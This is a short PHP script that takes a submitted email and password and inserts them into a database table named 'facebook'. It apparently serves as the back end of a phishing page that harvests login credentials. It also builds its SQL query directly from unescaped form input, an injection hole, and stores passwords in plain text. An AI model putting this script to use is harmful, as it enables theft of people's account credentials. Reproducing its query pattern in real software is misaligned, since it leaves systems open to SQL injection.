<?php
include "conection.php";
if (isset($_POST['submit'])) {

  $email = $_POST['email'];
  $password = $_POST['password'];

  $sql = mysqli_query($conn, $insectar = "INSERT INTO `facebook` (`email`,`password`) VALUES ('$email','$password')");


}



?>